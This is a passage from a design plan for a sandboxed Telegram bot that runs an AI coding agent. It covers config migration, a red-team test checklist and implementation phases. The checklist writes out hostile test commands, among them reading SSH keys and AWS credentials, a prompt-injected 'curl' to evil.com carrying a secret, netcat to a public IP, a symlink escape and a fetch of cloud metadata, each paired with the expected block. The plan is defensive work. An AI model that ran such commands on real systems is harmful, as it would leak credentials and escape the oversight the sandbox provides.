├── config.ts            # Sandbox config (FS + Env + Net)
├── network-proxy.ts     # NEW: Network isolation proxy
├── env.ts               # NEW: Env var allowlist/denylist
└── index.ts

src/totp-daemon/         # Keep all
```

### Files to Keep (Strict Profile Only - Lazy Loaded)

```
src/security/
├── observer.ts
├── fast-path.ts
├── approvals.ts
├── permissions.ts
├── circuit-breaker.ts
└── totp-session.ts

.claude/skills/
└── security-gate/       # Only loaded in strict profile
```

---

## Part 5: Migration Path

### For Existing Users

```typescript
function migrateConfig(config: unknown): TelclaudeConfig {
  if (hasLegacySecurityConfig(config)) {
    logger.info('Migrating legacy config to strict profile');

    // Log migration summary
    const summary = {
      previousTiers: config.security?.permissions?.users ?? {},
      observerWasEnabled: config.security?.observer?.enabled ?? false,
      approvalsWereEnabled: config.security?.approvals?.enabled ?? false,
    };
    logger.info('Migration summary:', summary);

    return {
      ...config,
      security: {
        profile: 'strict',  // Preserve existing behavior
        ...config.security,
      },
    };
  }
  return config;
}
```

### Telegram Notice on First Message Post-Migration

```typescript
if (pendingMigrationNotice && isAdmin(ctx)) {
  await ctx.reply(
    `ℹ️ Telclaude config was migrated to v2 format.\n` +
    `Your settings are preserved under 'strict' profile.\n` +
    `Run \`telclaude doctor\` for details.`
  );
  pendingMigrationNotice = false;
}
```

---

## Part 6: Security Test Checklist

**Red team verification - run these before release:**

### Filesystem Isolation
- [ ] From inside sandbox, try to read `~/.ssh/id_rsa`
  - Expected: Access denied at FS level
- [ ] If somehow read, verify output filter blocks it
  - Expected: `[REDACTED:PRIVATE_KEY]` in response
- [ ] Try to read `~/.aws/credentials`
  - Expected: Access denied
- [ ] Try to write to `~/.bashrc`
  - Expected: Access denied
- [ ] **Symlink escape test**: In `/workspace`, create `ln -s ~/.ssh leak-ssh` and try to read via symlink
  - Expected: Blocked (symlink resolves outside allowed paths)
- [ ] **Private /tmp test**: Check that files in host `/tmp` are not visible inside sandbox
  - Expected: Sandbox sees empty/private `/tmp`, not host tmp
- [ ] **Home directory test**: Inside sandbox, `ls ~` or `ls /home/sandbox`
  - Expected: Empty or access denied (not host's home)

### Environment Isolation
- [ ] Set `ANTHROPIC_API_KEY=secret` in env before starting telclaude
- [ ] From inside sandbox, try `echo $ANTHROPIC_API_KEY`
  - Expected: Empty or undefined
- [ ] Try `env | grep -i secret`
  - Expected: No matches
- [ ] Verify PATH and LANG are available
  - Expected: Present with safe values

### Network Isolation
- [ ] Inject prompt to `curl https://evil.com?secret=xxx`
  - Expected: Connection blocked by proxy
- [ ] Try `curl http://169.254.169.254/latest/meta-data/`
  - Expected: Blocked (cloud metadata)
- [ ] Try `curl http://localhost:8080/`
  - Expected: Blocked (localhost)
- [ ] Try `git push` to allowed domain
  - Expected: Blocked (POST not allowed by default)
- [ ] Add `api.github.com` to allowPost, verify `doctor` warns
- [ ] **Raw TCP test**: Try `nc <public-ip> 443` from inside sandbox
  - Expected: Blocked (non-HTTP TCP)
- [ ] **HTTP exfil test**: Try `curl "https://registry.npmjs.org/foo?secret=GH_PAT_HERE"`
  - Decide: Either accept (simple profile) or block if secret pattern detected (strict profile)
- [ ] **RFC1918 test**: Try `curl http://192.168.1.1/` or `http://10.0.0.1/`
  - Expected: Blocked (private ranges)

### Secret Detection
- [ ] Have prompt that outputs a fake GitHub PAT (`ghp_...`)
  - Expected: Redacted in response
  - Expected: Audit log shows `secret_redacted: true` without the actual value
- [ ] Output a high-entropy base64 blob
  - Expected: Entropy detection catches it
- [ ] Add custom pattern via config, verify it works
- [ ] Verify core patterns cannot be removed via config
- [ ] **Streaming chunk boundary test**: Send response with PAT split across artificial chunks
  - Input chunks: `["key: ghp_abc12345", "6789abcdefghij..."]`
  - Expected: Final Telegram message shows `[REDACTED:GITHUB_PAT]`, not the partial token

### Auth
- [ ] Add bot to public group, send message
  - Expected: Admin claim rejected (private only)
- [ ] Start fresh, send first message
  - Expected: Claim flow with confirmation code
- [ ] Try to approve with wrong code
  - Expected: Rejected
- [ ] With TOTP required, try to link without code
  - Expected: Rejected

### Rate Limiting
- [ ] Send 100 messages rapidly
  - Expected: Rate limited after threshold
- [ ] Verify per-chat limits work independently of global

### Audit Logs
- [ ] Verify security events are logged
- [ ] Verify prompts/responses in logs are redacted
- [ ] Verify no raw secrets appear in any log file

---

## Summary: Before vs After

### Before (Current)

```
7 layers, all on by default:
├── Fast-path regex
├── Observer (Haiku)
├── Permission tiers (READ_ONLY/WRITE_LOCAL/FULL)
├── Approval workflows
├── Rate limiting
├── Identity linking
└── OS Sandbox (filesystem only)

Problems:
- Soft layers bypassable
- Latency from observer
- Approval fatigue
- Complex config
- No network isolation
- No env isolation
- Logs can leak secrets
```

### After (v2)

```
Hard enforcement (always on):
├── OS Sandbox (filesystem)
├── Environment isolation (NEW)
├── Network isolation (NEW)
├── Secret output filter (core + additive)
├── Auth + optional TOTP
├── Rate limiting (global + per-chat)
└── Audit logging (with redaction)

Soft policy (opt-in via strict profile):
├── Fast-path regex
├── Observer (Haiku)
├── Permission tiers
└── Approval workflows

Benefits:
- Simple profile: fast, frictionless, still secure
- Strict profile: defense-in-depth for paranoid/multi-user
- Clear mental model: sandbox is THE boundary
- Triple isolation: FS + Env + Network
- Logs protected from secret leakage
- First-run UX guides users to security
```

---

## Implementation Checklist

### Phase 1: Profiles + Pipeline
- [ ] Add `security.profile` to config schema
- [ ] Create `src/security/pipeline.ts` with `SecurityPipeline` interface
- [ ] Implement `buildSecurityPipeline()` factory
- [ ] Remove `bypassPermissions` flag from SDK calls
- [ ] Refactor `auto-reply.ts` to use pipeline
- [ ] Add `--profile` and `--simple` CLI flags
- [ ] Write unit tests for pipeline

### Phase 2: Environment + Network Isolation
- [ ] Create `src/sandbox/env.ts` with allowlist/denylist
- [ ] Create `src/sandbox/network-proxy.ts`
- [ ] Implement method restrictions (GET/HEAD default)
- [ ] Block localhost/RFC1918/metadata
- [ ] Add feature flag for network proxy rollout
- [ ] Implement `doctor --network` self-test
- [ ] Integrate with sandbox manager

### Phase 3: Config + First-Run UX
- [ ] Create minimal default config template
- [ ] Implement admin claim flow with confirmation
- [ ] Add first-run TOTP prompt
- [ ] Implement `telclaude reset-auth` command
- [ ] Create migration logic with summary logging
- [ ] Add Telegram notice for migrated configs

### Phase 4: Secret Filter Enhancements
- [ ] Implement core + additive pattern model
- [ ] Add entropy detection
- [ ] Ensure audit logs go through redaction
- [ ] Add TOTP seed pattern
- [ ] Write secret detection tests

### Phase 5: CLI + Doctor
- [ ] Update doctor output to show all pillars
- [ ] Add `--network` self-test
- [ ] Add `--secrets` detection test
- [ ] Show POST-enabled domains with warning
- [ ] Show migration status

### Phase 6: Documentation
- [ ] Update CLAUDE.md security section
- [ ] Write MIGRATION.md guide
- [ ] Update troubleshooting docs
- [ ] Document threat model

### Phase 7: Security Verification
- [ ] Run full security test checklist
- [ ] External security review (optional)
- [ ] Penetration test sandbox escapes (optional)

---

## Sources

- [Trail of Bits: Prompt Injection to RCE in AI Agents (Oct 2025)](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)
- [Anthropic: Claude Code Sandboxing (Nov 2025)](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Design Patterns for LLM Agent Security (arxiv, Jun 2025)](https://arxiv.org/html/2506.08837v1)
- [OWASP Top 10 for LLM 2025](https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/)
- [FAR AI: Layered Defenses Have Holes](https://www.far.ai/news/defense-in-depth)
- [gVisor: Container Security](https://gvisor.dev/)
- [Anthropic sandbox-runtime (GitHub)](https://github.com/anthropic-experimental/sandbox-runtime)

---

## Approval

**Status:** Ready for implementation

**Reviewer feedback incorporated:**

*Round 2:*
- [x] Explicit threat model section
- [x] Environment isolation (Pillar 2)
- [x] Network proxy method/port restrictions
- [x] Block localhost/RFC1918/metadata
- [x] Secret filter core + additive model
- [x] Entropy detection for encoded secrets
- [x] Logs as leak channel protection
- [x] Single-user auth narrowing (private chats only)
- [x] First-run TOTP prompt
- [x] Linked mode TOTP enforcement
- [x] Rate limiting dimensions (per-chat)
- [x] Audit log sensitivity buckets
- [x] Remove bypassPermissions flag
- [x] Doctor messaging for strict profile
- [x] Unit-testable pipeline + test profile
- [x] Network proxy feature flag
- [x] Doctor --network self-test
- [x] First message confirmation flow
- [x] Migration summary logging
- [x] Security test checklist

*Round 3:*
- [x] Private /tmp isolation (sandbox gets own tmp, not host tmp)
- [x] Symlink escape protection + test case
- [x] HOME vs FS config alignment documentation
- [x] ENV_ALLOWLIST implicit deny documentation
- [x] HTTP exfil stance explicitly documented (simple=accept, strict=optional filtering)
- [x] Non-HTTP protocol blocking (raw TCP)
- [x] Streaming redaction across chunk boundaries
- [x] Surface area checklist (everything leaving process must be redacted)
- [x] High-entropy tuning with metrics
- [x] reset-auth safety (explicit confirmation + audit log)
- [x] Per-action TOTP concept (future enhancement)
- [x] Lazy loading for strict-only code
- [x] TEST_PROFILE explicit handling
- [x] Expanded security test checklist (symlink, streaming, HTTP exfil, raw TCP, RFC1918)
